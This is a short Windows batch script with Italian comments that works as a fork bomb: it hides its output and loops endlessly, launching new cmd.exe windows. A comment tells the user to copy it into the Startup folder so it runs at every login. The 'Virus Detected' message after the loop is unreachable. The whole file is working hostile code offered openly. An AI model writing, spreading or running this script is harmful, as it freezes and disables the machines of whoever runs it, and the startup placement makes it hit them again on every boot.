:: Per eseguire il file all'avvio, copiare il file .bat in => Win+R shell:startup

:: Non visualizzo informazioni
@echo off
CLS

:: Parte la fork bomb
:A
start cmd.exe
goto A
echo "Virus Detected"
pause